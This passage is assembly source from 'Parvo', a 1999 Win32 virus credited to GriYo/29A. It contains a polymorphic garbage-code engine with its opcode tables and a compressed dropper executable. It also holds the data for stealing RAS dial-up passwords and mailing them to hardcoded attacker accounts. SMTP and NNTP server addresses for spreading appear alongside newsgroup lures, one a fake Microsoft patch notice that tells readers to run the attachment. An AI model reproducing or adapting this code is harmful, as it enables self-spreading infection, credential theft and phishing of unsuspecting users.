                test byte ptr [ebx+REG_FLAGS],REG_NO_8BIT
                jnz a_dec_reg8
				call get_rnd32
				and ah,04h
				or ah,byte ptr [ebx+REG_MASK]
				or ah,0C8h
				mov al,0FEh
				stosw
a_dec_reg8:		ret

;----------------------------------------------------------------------------
;Generate ADD/SUB/XOR/OR/AND reg,imm
;----------------------------------------------------------------------------

g_mathregimm32: mov al,81h
                stosb
                call get_valid_reg
                call do_math_work
                stosd
                ret

g_mathregimm16: mov ax,8166h
                stosw
                call get_valid_reg
                call do_math_work
                stosw
                ret

g_mathregimm8:  call get_valid_reg
                test byte ptr [ebx+REG_FLAGS],REG_NO_8BIT
                jnz a_math8
                mov al,80h
                stosb
                call do_math_work
                stosb
                and ah,04h
                or byte ptr [edi-00000002h],ah
a_math8:        ret

do_math_work:   mov eax,end_math_imm-tbl_math_imm
                call get_rnd_range
                lea esi,dword ptr [ebp+eax+tbl_math_imm]
                lodsb
                or al,byte ptr [ebx+REG_MASK]
                stosb
                call get_rnd32
                ret

;----------------------------------------------------------------------------
;Generate push reg + garbage + pop reg
;----------------------------------------------------------------------------

g_push_g_pop:   ;Note that garbage generator can call itself in a
                ;recursive way, so structures like the following
                ;example can be produced
                ;
                ;       push reg_1
                ;       ...
                ;       push reg_2
                ;       ...
                ;       pop reg_2
                ;       ...
                ;       pop reg_1
                ;

                call get_rnd_reg
                mov al,50h
                or al,byte ptr [ebx+REG_MASK]
                stosb
                call gen_garbage
                call get_valid_reg
                mov al,58h
                or al,byte ptr [ebx+REG_MASK]
                stosb
                ret

;----------------------------------------------------------------------------
;Generate CALL without return
;----------------------------------------------------------------------------

g_call_cont:    mov al,0E8h
                stosb
                push edi
                stosd
                call gen_rnd_block
                pop edx
                mov eax,edi
                sub eax,edx
                sub eax,00000004h
                mov dword ptr [edx],eax
                call gen_garbage
                call get_valid_reg
                mov al,58h
                or al,byte ptr [ebx+REG_MASK]
                stosb
                ret

;----------------------------------------------------------------------------
;Generate unconditional jumps
;----------------------------------------------------------------------------

g_jump_u:       mov al,0E9h
                stosb
                push edi
                stosd
                call gen_rnd_block
                pop edx
                mov eax,edi
                sub eax,edx
                sub eax,00000004h
                mov dword ptr [edx],eax
                ret

;----------------------------------------------------------------------------
;Generate conditional jumps
;----------------------------------------------------------------------------

g_jump_c:       call get_rnd32
                and ah,0Fh
                add ah,80h
                mov al,0Fh
                stosw
                push edi
                stosd
                call gen_garbage
                pop edx
                mov eax,edi
                sub eax,edx
                sub eax,00000004h
                mov dword ptr [edx],eax
                ret

;----------------------------------------------------------------------------
;Generate one byte garbage code that does not change reg values
;----------------------------------------------------------------------------

gen_save_code:  mov eax,end_save_code-tbl_save_code
                call get_rnd_range
                mov al,byte ptr [ebp+tbl_save_code+eax]
                stosb
                ret

;----------------------------------------------------------------------------
;Get a ramdom reg
;----------------------------------------------------------------------------

get_rnd_reg:    mov eax,00000007h
                call get_rnd_range
                lea ebx,dword ptr [ebp+tbl_regs+eax*02h]
                ret

;----------------------------------------------------------------------------
;Get a ramdom reg (avoid REG_READ_ONLY, REG_IS_COUNTER and REG_IS_INDEX)
;----------------------------------------------------------------------------

get_valid_reg:  call get_rnd_reg
                mov al,byte ptr [ebx+REG_FLAGS]
                and al,REG_IS_INDEX or REG_IS_COUNTER or REG_READ_ONLY
                jnz get_valid_reg
                ret

;----------------------------------------------------------------------------
;Load ecx with crypt_size / oper_size
;----------------------------------------------------------------------------

fixed_size2ecx: mov eax,inf_size
                xor ecx,ecx
                mov cl,byte ptr [ebp+oper_size]
                shr ecx,01h
                or ecx,ecx
                jz ok_2ecx
                shr eax,cl
                jnc ok_2ecx
                inc eax
ok_2ecx:        mov ecx,eax
                ret

;----------------------------------------------------------------------------
;Poly engine initialized data
;----------------------------------------------------------------------------

                ;------------------------------------------------------------
                ;Register table
                ;
                ; 00h -> BYTE -> Register mask
                ; 01h -> BYTE -> Register flags
                ;------------------------------------------------------------

tbl_regs        equ this byte

                db 00000000b,REG_READ_ONLY      ;eax
                db 00000011b,00h                ;ebx
                db 00000001b,00h                ;ecx
                db 00000010b,00h                ;edx
                db 00000110b,REG_NO_8BIT        ;esi
                db 00000111b,REG_NO_8BIT        ;edi
                db 00000101b,REG_NO_8BIT        ;ebp

end_regs        equ this byte

                ;------------------------------------------------------------
                ;Aliases for reg table structure
                ;------------------------------------------------------------

REG_MASK        equ 00h
REG_FLAGS       equ 01h

                ;------------------------------------------------------------
                ;Bit aliases for reg flags
                ;------------------------------------------------------------

REG_IS_INDEX    equ 01h         ;Register used as main index register
REG_IS_COUNTER  equ 02h         ;This register is used as loop counter
REG_READ_ONLY   equ 04h         ;Never modify the value of this register
REG_NO_8BIT     equ 08h         ;ESI EDI and EBP havent 8bit version

                ;------------------------------------------------------------
                ;Initial reg flags
                ;------------------------------------------------------------

tbl_startup     equ this byte

                db REG_READ_ONLY        ;eax
                db 00h                  ;ebx
                db 00h                  ;ecx
                db 00h                  ;edx
                db REG_NO_8BIT          ;esi
                db REG_NO_8BIT          ;edi
                db REG_NO_8BIT          ;ebp

                ;------------------------------------------------------------
                ;Code that does not disturb reg values
                ;------------------------------------------------------------

tbl_save_code   equ this byte

                clc
                stc
                cmc
                cld
                std
                
end_save_code   equ this byte

                ;------------------------------------------------------------
                ;Generators for [reg] indexing mode
                ;------------------------------------------------------------

tbl_idx_reg     equ this byte

                dd offset xx_inc_reg
                dd offset xx_dec_reg
                dd offset xx_not_reg
                dd offset xx_add_reg
                dd offset xx_sub_reg
                dd offset xx_xor_reg

                ;------------------------------------------------------------
                ;Generators for [reg+imm] indexing mode
                ;------------------------------------------------------------

tbl_dis_reg     equ this byte

                dd offset yy_inc_reg
                dd offset yy_dec_reg
                dd offset yy_not_reg
                dd offset yy_add_reg
                dd offset yy_sub_reg
                dd offset yy_xor_reg

                ;------------------------------------------------------------
                ;Generators for [reg+reg] indexing mode
                ;------------------------------------------------------------

tbl_xtended     equ this byte

                dd offset zz_inc_reg
                dd offset zz_dec_reg
                dd offset zz_not_reg
                dd offset zz_add_reg
                dd offset zz_sub_reg
                dd offset zz_xor_reg

                ;------------------------------------------------------------
                ;Generators for [reg+reg+imm] indexing mode
                ;------------------------------------------------------------

tbl_paranoia    equ this byte

                dd offset ii_inc_reg
                dd offset ii_dec_reg
                dd offset ii_not_reg
                dd offset ii_add_reg
                dd offset ii_sub_reg
                dd offset ii_xor_reg

                ;------------------------------------------------------------
                ;Opcodes for math reg,imm
                ;------------------------------------------------------------

tbl_math_imm    equ this byte

                db 0C0h                         ;add
                db 0C8h                         ;or
                db 0E0h                         ;and
                db 0E8h                         ;sub
                db 0F0h                         ;xor
                db 0D0h                         ;adc
                db 0D8h                         ;sbb

end_math_imm    equ this byte

                ;------------------------------------------------------------
                ;Magic aliases
                ;------------------------------------------------------------

MAGIC_PUTKEY    equ 01h
MAGIC_PUTDISP   equ 02h
MAGIC_ENDSTR    equ 0FFh
MAGIC_ENDKEY    equ 0FEh
MAGIC_CAREEBP   equ 00h
MAGIC_NOTEBP    equ 0FFh

                ;------------------------------------------------------------
                ;Magic data
                ;------------------------------------------------------------

xx_inc_reg      db 0FEh
                db MAGIC_CAREEBP                
                db 00h
                db 00h
                dd offset x_inc_reg_byte
                dd offset x_inc_reg_word
                dd offset x_inc_reg_dword

xx_dec_reg      db 0FEh
                db MAGIC_CAREEBP                                
                db 08h
                db 00h
                dd offset x_dec_reg_byte
                dd offset x_dec_reg_word
                dd offset x_dec_reg_dword

xx_not_reg      db 0F6h
                db MAGIC_CAREEBP                
                db 10h
                db 00h
                dd offset x_not_reg_byte
                dd offset x_not_reg_word
                dd offset x_not_reg_dword

xx_add_reg      db 80h
                db MAGIC_CAREEBP
                db 00h
                db MAGIC_PUTKEY
                dd offset x_add_reg_byte
                dd offset x_add_reg_word
                dd offset x_add_reg_dword

xx_sub_reg      db 80h
                db MAGIC_CAREEBP
                db 28h
                db MAGIC_PUTKEY
                dd offset x_sub_reg_byte
                dd offset x_sub_reg_word
                dd offset x_sub_reg_dword
                  
xx_xor_reg      db 80h
                db MAGIC_CAREEBP
                db 30h
                db MAGIC_PUTKEY
                dd offset x_xor_reg_byte
                dd offset x_xor_reg_word
                dd offset x_xor_reg_dword

yy_inc_reg      db 0FEh
                db MAGIC_NOTEBP                
                db 80h
                db MAGIC_PUTDISP
                dd offset x_inc_reg_byte
                dd offset x_inc_reg_word
                dd offset x_inc_reg_dword

yy_dec_reg      db 0FEh
                db MAGIC_NOTEBP
                db 88h
                db MAGIC_PUTDISP
                dd offset x_dec_reg_byte
                dd offset x_dec_reg_word
                dd offset x_dec_reg_dword

yy_not_reg      db 0F6h
                db MAGIC_NOTEBP                
                db 90h
                db MAGIC_PUTDISP
                dd offset x_not_reg_byte
                dd offset x_not_reg_word
                dd offset x_not_reg_dword

yy_add_reg      db 80h
                db MAGIC_NOTEBP
                db 80h
                db MAGIC_PUTKEY or MAGIC_PUTDISP
                dd offset x_add_reg_byte
                dd offset x_add_reg_word
                dd offset x_add_reg_dword

yy_sub_reg      db 80h
                db MAGIC_NOTEBP
                db 0A8h
                db MAGIC_PUTKEY or MAGIC_PUTDISP
                dd offset x_sub_reg_byte
                dd offset x_sub_reg_word
                dd offset x_sub_reg_dword

yy_xor_reg      db 80h
                db MAGIC_NOTEBP
                db 0B0h
                db MAGIC_PUTKEY or MAGIC_PUTDISP
                dd offset x_xor_reg_byte
                dd offset x_xor_reg_word
                dd offset x_xor_reg_dword

zz_inc_reg      db 0FEh
                db MAGIC_CAREEBP
                db 04h
                db 00h
                dd offset x_inc_reg_byte
                dd offset x_inc_reg_word
                dd offset x_inc_reg_dword

zz_dec_reg      db 0FEh
                db MAGIC_CAREEBP
                db 0Ch
                db 00h
                dd offset x_dec_reg_byte
                dd offset x_dec_reg_word
                dd offset x_dec_reg_dword

zz_not_reg      db 0F6h
                db MAGIC_CAREEBP
                db 14h
                db 00h
                dd offset x_not_reg_byte
                dd offset x_not_reg_word
                dd offset x_not_reg_dword

zz_add_reg      db 80h
                db MAGIC_CAREEBP
                db 04h
                db MAGIC_PUTKEY
                dd offset x_add_reg_byte
                dd offset x_add_reg_word
                dd offset x_add_reg_dword

zz_sub_reg      db 80h
                db MAGIC_CAREEBP
                db 2Ch
                db MAGIC_PUTKEY
                dd offset x_sub_reg_byte
                dd offset x_sub_reg_word
                dd offset x_sub_reg_dword

zz_xor_reg      db 80h
                db MAGIC_CAREEBP
                db 34h
                db MAGIC_PUTKEY
                dd offset x_xor_reg_byte
                dd offset x_xor_reg_word
                dd offset x_xor_reg_dword

ii_inc_reg      db 0FEh
                db MAGIC_NOTEBP
                db 84h
                db MAGIC_PUTDISP
                dd offset x_inc_reg_byte
                dd offset x_inc_reg_word
                dd offset x_inc_reg_dword

ii_dec_reg      db 0FEh
                db MAGIC_NOTEBP
                db 8Ch
                db MAGIC_PUTDISP
                dd offset x_dec_reg_byte
                dd offset x_dec_reg_word
                dd offset x_dec_reg_dword

ii_not_reg      db 0F6h
                db MAGIC_NOTEBP
                db 94h
                db MAGIC_PUTDISP
                dd offset x_not_reg_byte
                dd offset x_not_reg_word
                dd offset x_not_reg_dword

ii_add_reg      db 80h
                db MAGIC_NOTEBP
                db 84h
                db MAGIC_PUTKEY or MAGIC_PUTDISP
                dd offset x_add_reg_byte
                dd offset x_add_reg_word
                dd offset x_add_reg_dword

ii_sub_reg      db 80h
                db MAGIC_NOTEBP
                db 0ACh
                db MAGIC_PUTKEY or MAGIC_PUTDISP
                dd offset x_sub_reg_byte
                dd offset x_sub_reg_word
                dd offset x_sub_reg_dword

ii_xor_reg      db 80h
                db MAGIC_NOTEBP
                db 0B4h
                db MAGIC_PUTKEY or MAGIC_PUTDISP
                dd offset x_xor_reg_byte
                dd offset x_xor_reg_word
                dd offset x_xor_reg_dword

                ;------------------------------------------------------------
                ;Reverse-code strings
                ;------------------------------------------------------------

x_inc_reg_byte  db 02h,0FEh,0C8h,MAGIC_ENDSTR
x_inc_reg_word  db 02h,66h,48h,MAGIC_ENDSTR
x_inc_reg_dword db 01h,48h,MAGIC_ENDSTR
x_dec_reg_byte  db 02h,0FEh,0C0h,MAGIC_ENDSTR
x_dec_reg_word  db 02h,66h,40h,MAGIC_ENDSTR
x_dec_reg_dword db 01h,40h,MAGIC_ENDSTR
x_not_reg_byte  db 02h,0F6h,0D0h,MAGIC_ENDSTR
x_not_reg_word  db 03h,66h,0F7h,0D0h,MAGIC_ENDSTR
x_not_reg_dword db 02h,0F7h,0D0h,MAGIC_ENDSTR
x_add_reg_byte  db 01h,2Ch,MAGIC_ENDKEY
x_add_reg_word  db 02h,66h,2Dh,MAGIC_ENDKEY
x_add_reg_dword db 01h,2Dh,MAGIC_ENDKEY
x_sub_reg_byte  db 01h,04h,MAGIC_ENDKEY
x_sub_reg_word  db 02h,66h,05h,MAGIC_ENDKEY
x_sub_reg_dword db 01h,05h,MAGIC_ENDKEY
x_xor_reg_byte  db 01h,34h,MAGIC_ENDKEY
x_xor_reg_word  db 02h,66h,35h,MAGIC_ENDKEY
x_xor_reg_dword db 01h,35h,MAGIC_ENDKEY

                ;------------------------------------------------------------
                ;Format for each style-table entry:
                ;
                ; 00h -> DWORD -> Address of generator
                ; 04h -> DWORD -> Address of generated subroutine or
                ;                 00000000h if not yet generated
                ;
                ;------------------------------------------------------------

style_table     equ this byte

                dd offset gen_get_delta
                dd 00000000h

                dd offset gen_load_ctr
                dd 00000000h

                dd offset gen_decrypt
                dd 00000000h

                dd offset gen_next_step
                dd 00000000h

                dd offset gen_next_ctr
                dd 00000000h

                ;Garbage code generators

tbl_garbage     equ this byte

                dd offset gen_save_code         ;clc stc cmc cld std
                dd offset g_movreg32imm         ;mov reg32,imm
                dd offset g_movreg16imm         ;mov reg16,imm
                dd offset g_movreg8imm          ;mov reg8,imm
				dd offset g_xchgregreg32		;xchg reg32,reg32
				dd offset g_xchgregreg16		;xchg reg16,reg16
				dd offset g_xchgregreg8			;xchg reg8,reg8
                dd offset g_movregreg32         ;mov reg32,reg32
                dd offset g_movregreg16         ;mov reg16,reg16
                dd offset g_movregreg8          ;mov reg8,reg8
				dd offset g_inc_reg32			;inc reg32
				dd offset g_inc_reg16			;inc reg16
				dd offset g_inc_reg8			;inc reg8
				dd offset g_dec_reg32			;dec reg32
				dd offset g_dec_reg16			;dec reg16
				dd offset g_dec_reg8			;dec reg8
                dd offset g_mathregimm32        ;math reg32,imm
                dd offset g_mathregimm16        ;math reg16,imm
                dd offset g_mathregimm8         ;math reg8,imm
                dd offset g_push_g_pop          ;push reg/garbage/pop reg
                dd offset g_call_cont           ;call/garbage/pop
                dd offset g_jump_u              ;jump/rnd block
                dd offset g_jump_c              ;jump conditional/garbage
                dd offset g_movzx_movsx         ;movzx/movsx reg32,reg16

end_garbage     equ this byte

                ;------------------------------------------------------------
                ;Seed for random number generator
                ;------------------------------------------------------------

rnd32_seed      dd 0DEADBABEh			;Let this into initialized area!!!!

;----------------------------------------------------------------------------
;Dropper compressed data
;----------------------------------------------------------------------------

dropper_pack	equ $

				db 011h, 000h, 04Dh, 05Ah, 050h, 000h, 002h, 000h
				db 000h, 000h, 004h, 000h, 00Fh, 000h, 0FFh, 0FFh
				db 000h, 000h, 0B8h, 007h, 080h, 003h, 000h, 040h
				db 000h, 01Ah, 022h, 080h, 03Bh, 000h, 001h, 000h
				db 000h, 0BAh, 010h, 000h, 00Eh, 01Fh, 0B4h, 009h
				db 0CDh, 021h, 0B8h, 001h, 04Ch, 0CDh, 021h, 090h
				db 090h, 054h, 068h, 069h, 073h, 020h, 070h, 072h
				db 06Fh, 067h, 072h, 061h, 06Dh, 020h, 06Dh, 075h
				db 073h, 074h, 020h, 062h, 065h, 020h, 072h, 075h
				db 06Eh, 020h, 075h, 06Eh, 064h, 065h, 072h, 020h
				db 057h, 069h, 06Eh, 033h, 032h, 00Dh, 00Ah, 024h
				db 037h, 088h, 080h, 00Ch, 000h, 050h, 045h, 000h
				db 000h, 04Ch, 001h, 004h, 000h, 03Ch, 025h, 00Eh
				db 06Ah, 008h, 080h, 00Eh, 000h, 0E0h, 000h, 08Eh
				db 081h, 00Bh, 001h, 002h, 019h, 000h, 006h, 000h
				db 000h, 000h, 044h, 007h, 080h, 009h, 000h, 010h
				db 000h, 000h, 000h, 010h, 000h, 000h, 000h, 020h
				db 004h, 080h, 00Bh, 000h, 040h, 000h, 000h, 010h
				db 000h, 000h, 000h, 002h, 000h, 000h, 001h, 007h
				db 080h, 003h, 000h, 003h, 000h, 00Ah, 006h, 080h
				db 005h, 000h, 080h, 000h, 000h, 000h, 004h, 006h
				db 080h, 001h, 000h, 002h, 005h, 080h, 004h, 000h
				db 010h, 000h, 000h, 020h, 004h, 080h, 004h, 000h
				db 010h, 000h, 000h, 010h, 006h, 080h, 001h, 000h
				db 010h, 00Ch, 080h, 004h, 000h, 060h, 000h, 000h
				db 054h, 01Ch, 080h, 004h, 000h, 070h, 000h, 000h
				db 00Ch, 053h, 080h, 004h, 000h, 043h, 04Fh, 044h
				db 045h, 005h, 080h, 00Dh, 000h, 010h, 000h, 000h
				db 000h, 010h, 000h, 000h, 000h, 006h, 000h, 000h
				db 000h, 006h, 00Eh, 080h, 008h, 000h, 020h, 000h
				db 000h, 060h, 044h, 041h, 054h, 041h, 005h, 080h
				db 00Dh, 000h, 040h, 000h, 000h, 000h, 020h, 000h
				db 000h, 000h, 040h, 000h, 000h, 000h, 00Ch, 00Eh
				db 080h, 01Ah, 000h, 040h, 000h, 000h, 0C0h, 02Eh
				db 069h, 064h, 061h, 074h, 061h, 000h, 000h, 000h
				db 010h, 000h, 000h, 000h, 060h, 000h, 000h, 000h
				db 002h, 000h, 000h, 000h, 04Ch, 00Eh, 080h, 01Ah
				db 000h, 040h, 000h, 000h, 0C0h, 02Eh, 072h, 065h
				db 06Ch, 06Fh, 063h, 000h, 000h, 000h, 010h, 000h
				db 000h, 000h, 070h, 000h, 000h, 000h, 002h, 000h
				db 000h, 000h, 04Eh, 00Eh, 080h, 004h, 000h, 040h
				db 000h, 000h, 050h, 068h, 087h, 005h, 000h, 0FFh
				db 025h, 030h, 060h, 040h, 0FBh, 0C1h, 002h, 000h
				db 028h, 060h, 00Ah, 080h, 006h, 000h, 038h, 060h
				db 000h, 000h, 030h, 060h, 016h, 080h, 002h, 000h
				db 046h, 060h, 006h, 080h, 002h, 000h, 046h, 060h
				db 006h, 080h, 00Ch, 000h, 04Bh, 045h, 052h, 04Eh
				db 045h, 04Ch, 033h, 032h, 02Eh, 064h, 06Ch, 06Ch
				db 004h, 080h, 00Bh, 000h, 045h, 078h, 069h, 074h
				db 050h, 072h, 06Fh, 063h, 065h, 073h, 073h, 0AEh
				db 081h, 009h, 000h, 010h, 000h, 000h, 00Ch, 000h
				db 000h, 000h, 002h, 034h, 0F6h, 081h

;----------------------------------------------------------------------------
;Copyright string ;)
;----------------------------------------------------------------------------

szSemaphoreName	db 'PARVOVIROSIS',00h

				db ' - '
				db 'Parvo BioCoded by GriYo / 29A'
				db ' - '				
				db 'Win32 Tech Support by Jacky Qwerty / 29A'
				db ' - '				
				db 'Thanks to Darkman / 29A '
				db 'and b0z0 / Ikx for their ideas and strategy'
				db ' - '				
				db 'Parvo is a research speciment, do not distribute'
				db ' - '				
				db '©1999 29A Labs ... We create life'
				db ' - '				

;----------------------------------------------------------------------------
;Contains information about how to restore host program
;----------------------------------------------------------------------------

ep_junk_size	equ 0100h

OrgSize			dd 00000000h
SizeOfModCode	dd 00000002h
OrgSizeOfImg	dd 00000000h

OrgEPCode		dw 9090h						;Here is a RET for 1st gen
				db ep_junk_size-02h dup (00h)

OrgSH			db IMAGE_SIZEOF_SECTION_HEADER dup (00h)

;----------------------------------------------------------------------------
;CRC32 of 'KERNEL32.DLL'
;----------------------------------------------------------------------------

CrcKernel32		dd 00000000h

;----------------------------------------------------------------------------
;CRC32 of API names
;----------------------------------------------------------------------------

CrcGetProcAddr	dd 00000000h	;This API takes special care

CRC32K32Apis	dd NumK32Apis	dup (00000000h)
CRC32WS32Apis	dd NumWS32Apis	dup (00000000h)
CRC32RASApis	dd NumRASApis	dup (00000000h)
CRC32ADApis		dd NumADApis	dup (00000000h)

;----------------------------------------------------------------------------
;This virus only infects certain files... This table contains the CRC32
;of each filename allowed for infection
;----------------------------------------------------------------------------

filesAllow		dd NumberOfAllow dup (00000000h)		

;----------------------------------------------------------------------------
;Mail accounts that will recibe stolen passwords
;----------------------------------------------------------------------------

GriYo_mail_00	db '<XTRO001@lycosmail.com>',00h		;Test OK
GriYo_mail_01	db '<xtro002@lettera.net>',00h		;Test OK
GriYo_mail_02	db '<XTRO004@usa.net>',00h			;Test OK
GriYo_mail_03	db '<XTRO007@mailexcite.com>',00h		;Test OK

MyAccounts		equ $

				dd offset GriYo_mail_00
				dd offset GriYo_mail_01
				dd offset GriYo_mail_02
				dd offset GriYo_mail_03

NumOfMyAccounts	equ ($-MyAccounts)/04h

;----------------------------------------------------------------------------
;Ip address of several SMTP servers
;----------------------------------------------------------------------------

tbl_SMTP		equ $

				dd offset szMailIp_00
				dd offset szMailIp_01
				dd offset szMailIp_02
				dd offset szMailIp_03
				dd offset szMailIp_04
				dd offset szMailIp_05

NumOfSMTP		equ ($-tbl_SMTP)/04h

szMailIp_00		db '193.127.65.2',00h		; vinci.ceselsa.es
szMailIp_01		db '194.175.0.2',00h		; mail.meeting.de
szMailIp_02		db '194.175.0.201',00h		; home.meeting.de
szMailIp_03		db '195.77.138.18',00h		; mail.oninet.es
szMailIp_04		db '195.77.203.4',00h		; frut.com
szMailIp_05		db '206.103.36.7',00h		; mail.meeting.com

;----------------------------------------------------------------------------
;Ip address of several NNTP servers
;----------------------------------------------------------------------------

tbl_NNTP		equ $

				dd offset szNewsIp_00
				dd offset szNewsIp_01

NumOfNNTP		equ ($-tbl_NNTP)/04h

szNewsIp_00		db '194.179.3.156',00h		; noticias.ibernet.es
szNewsIp_01		db '194.179.8.156',00h		; noticias.bcn.ibernet.es

;----------------------------------------------------------------------------
;Registry keys to find executables associated with a file extension
;----------------------------------------------------------------------------

key_html		db 'SOFTWARE\Classes\htmlfile\shell\open\command',00h
key_mailto		db 'SOFTWARE\Classes\mailto\shell\open\command',00h

;----------------------------------------------------------------------------
;Strings used in the password stealing routines
;----------------------------------------------------------------------------

lamer_domain	db 'lamer.net',0Ah,00h
lamer_domain_s	equ $-lamer_domain

lamer_mail		db '<lamer@lamer.net>'

szRASEntrieName	db 0Ah,'Name:     ',00h
szRASPhoneNum	db 0Ah,'Phone:    ',00h
szRASCallBack	db 0Ah,'Callback: ',00h
szRASUserName	db 0Ah,'Username: ',00h
szRASPassword	db 0Ah,'Password: ',00h
szRASDomain		db 0Ah,'Domain:   ',00h

;----------------------------------------------------------------------------
;Strings used in mail message building routines
;----------------------------------------------------------------------------

szMailStr_01	db 'helo '

domain_here		db 20h dup (00h)

szMailStr_02	db 'mail from: '

mail_from_here0	db 40h dup (00h)

szMailStr_03	db 'rcpt to: '

mail_to_here_00	db 40h dup (00h)

szMailStr_04	db 'data',0Ah,00h

szMailStr_05	db 'from: '

mail_from_here1	db 40h dup (00h)

szMailStr_06	db 'to: '

mail_to_here_01	db 40h dup (00h)

szMailStr_07	db 'subject: '

subject_here	db 80h dup (00h)

szMailNewLine	db 0Ah,00h

szMailEnd		db 0Ah,'.',0Ah,00h
szMailBye		db 'quit'

mail_headers	equ $

				dd offset szMailStr_01
				db 00h
				dd offset szMailStr_02
				db 00h
				dd offset szMailStr_03
				db 00h
				dd offset szMailStr_04
				db 00h
				dd offset szMailStr_05
				db 0FFh
				dd offset szMailStr_06
				db 0FFh
				dd offset szMailStr_07
				db 0FFh

NumberOfHeaders	equ ($-mail_headers)/05h

mail_end		equ $

				dd offset szMailNewLine
				db 0FFh
				dd offset szMailEnd
				db 00h
				dd offset szMailBye
				db 0FFh

NumberOfMailEnd	equ ($-mail_end)/05h

;----------------------------------------------------------------------------
;Names of newsgroups
;----------------------------------------------------------------------------

NG_index_table	equ $

				;Index for groups about hack

				db NumOfHackNG
				dd offset groups_hack
				dd offset szHackDomain
				dd offset NGM_hack_org
				dd offset NGM_body_hack
				dd offset NGM_hack_sub
				dd offset NGM_hack_file

				;Index for groups about cracks

				db NumOfCracksNG
				dd offset groups_cracks
				dd offset szCracksDomain
				dd offset NGM_cracks_org
				dd offset NGM_body_cracks
				dd offset NGM_cracks_sub
				dd offset NGM_cracks_file

				;Index for groups about sex

				db NumOfSexNG
				dd offset groups_sex
				dd offset szSexDomain
				dd offset NGM_sex_org				
				dd offset NGM_body_sex
				dd offset NGM_sex_sub
				dd offset NGM_sex_file

NumOfNGIndex	equ ($-NG_index_table)/19h

                ;------------------------------------------------------------
				;Available group names
                ;------------------------------------------------------------

				;About hacking

sz_news_group00	db 'alt.bio.hackers',0Ah,00h
sz_news_group01	db 'alt.hacker',0Ah,00h
sz_news_group02	db 'alt.hackers',0Ah,00h
sz_news_group03	db 'alt.hackers.malicious',0Ah,00h
sz_news_group04	db 'alt.hacking',0Ah,00h
sz_news_group05	db 'alt.hacking.in.progress',0Ah,00h

				;About cracks and other binaries

sz_news_group06	db 'alt.binaries',0Ah,00h
sz_news_group07	db 'alt.binaries.bbs',0Ah,00h
sz_news_group08	db 'alt.binaries.cracked',0Ah,00h
sz_news_group09	db 'alt.binaries.cracks',0Ah,00h
sz_news_group0A	db 'alt.binaries.cracks.encrypted',0Ah,00h
sz_news_group0B	db 'alt.binaries.dominion.cracks',0Ah,00h
sz_news_group0C	db 'alt.crackers',0Ah,00h
sz_news_group0D	db 'alt.cracks',0Ah,00h
sz_news_group0E	db 'alt.binaries.test',0Ah,00h

				;About xxx

sz_news_group0F	db 'alt.binaries.erotica',0Ah,00h
sz_news_group10	db 'alt.binaries.erotica.breasts',0Ah,00h
sz_news_group11	db 'alt.binaries.erotica.fetish',0Ah,00h
sz_news_group12	db 'alt.binaries.erotica.pornstar',0Ah,00h
sz_news_group13	db 'alt.binaries.multimedia.erotica',0Ah,00h
sz_news_group14	db 'es.binarios.sexo',0Ah,00h
sz_news_group15	db 'es.charla.sexo',00h

				;Spanish groups

sz_news_group16	db 'es.pruebas',0Ah,00h
sz_news_group17	db 'es.comp.hackers',0Ah,00h
sz_news_group18	db 'es.binarios.sexo',0Ah,00h
sz_news_group19	db 'es.charla.sexo',0Ah,00h
sz_news_group1A	db 'es.binarios.misc',0Ah,00h

                ;------------------------------------------------------------
				;Groups about hack
                ;------------------------------------------------------------

szHackDomain	db 'microsoft.com',0Ah,00h

groups_hack		equ $

				dd offset sz_news_group00
				dd offset sz_news_group01
				dd offset sz_news_group02
				dd offset sz_news_group03
				dd offset sz_news_group04
				dd offset sz_news_group05
				dd offset sz_news_group06
				dd offset sz_news_group07
				dd offset sz_news_group08
				dd offset sz_news_group09
				dd offset sz_news_group0A
				dd offset sz_news_group0B
				dd offset sz_news_group0C
				dd offset sz_news_group0D
				dd offset sz_news_group0E

				dd offset sz_news_group16
				dd offset sz_news_group17
				dd offset sz_news_group18
				dd offset sz_news_group19
				dd offset sz_news_group1A

NumOfHackNG		equ ($-groups_hack)/04h

NGM_body_hack	db 0Ah,0Ah
				db 'A new and dangerous virus has hit the Internet.'
				db 0Ah,0Ah
				db 'DESCRIPTION:'
				db 0Ah,0Ah
				db 'When the email client receives a malicious mail or '
				db 'news message that contains an attachment with a very '
				db 'long filename, it could cause the email to '
				db 'execute arbitrary code automaticly '
				db 'on the client workstation, thus infecting the machine.'
				db 0Ah,0Ah
				db 'Microsoft has been aware of this problem from the '
				db 'very beginning and presents here a patch for the two '
				db 'of our products in which it exploits.'
				db 0Ah,0Ah
				db 'Outlook 98 on Windows® 95, Windows 98 and '
				db 'Microsoft Windows NT® 4.0',0Ah
				db 'Outlook Express 4.0, 4.01 (including 4.01 with '
				db 'Service Pack 1) on Windows 95, Windows 98 and '
				db 'Windows NT 4.0',0Ah
				db 'Netscape Mail Clients'
				db 0Ah,0Ah
				db 'SOLUTION:'
				db 0Ah,0Ah
				db 'Customers using this products for Windows 95, '
				db 'Windows 98 or Windows NT 4.0 should execute the '
				db 'attached patch or download an updated patch from:'
				db 0Ah,0Ah
				db 'http://www.microsoft.com/outlook/enhancements/'
				db 'outptch2.asp'
				db 0Ah,0Ah
				db 'Please patch your computer(s) as soon as possible and '
				db 'help us fight this threat to the Internet.'
				db 0Ah,0Ah
				db 'Thank for your time.'
				db 0Ah,0Ah
				db 'Microsoft Support',0Ah
NGM_hack_org	db '<support@microsoft.com>'
				db 0Ah,0Ah
				db '--'
				db 00h

NGM_hack_sub	db 'Present security risk using Microsoft Internet '
				db 'Explorer and Outlook Express',0Ah,00h

NGM_hack_file	db 'msefixi'					;Have to be 07h characters

                ;------------------------------------------------------------
				;Groups about cracks
                ;------------------------------------------------------------

szCracksDomain	db 'quicknet.com',0Ah,00h

groups_cracks	equ $

				dd offset sz_news_group00
				dd offset sz_news_group01
				dd offset sz_news_group02
				dd offset sz_news_group03
				dd offset sz_news_group04
				dd offset sz_news_group05
				dd offset sz_news_group06
				dd offset sz_news_group07
				dd offset sz_news_group08
				dd offset sz_news_group09
				dd offset sz_news_group0A
				dd offset sz_news_group0B
				dd offset sz_news_group0C
				dd offset sz_news_group0D
				dd offset sz_news_group0E

NumOfCracksNG	equ ($-groups_cracks)/04h

NGM_body_cracks	db 0Ah,0Ah
				db 'Hi',0Ah,0Ah
				db 'Do you need a serial number for a unregistrated '
				db 'program of yours?'
				db 0Ah,0Ah
				db 'Do you feel like you have looked for it everywhere?'
				db 0Ah,0Ah
				db 'Even in the newest version of Phrozen Crews Oscar?'
				db 0Ah,0Ah
				db 'If you can answer -yes- to some of the above questions '
				db 'and are still looking for a serial number, this might '
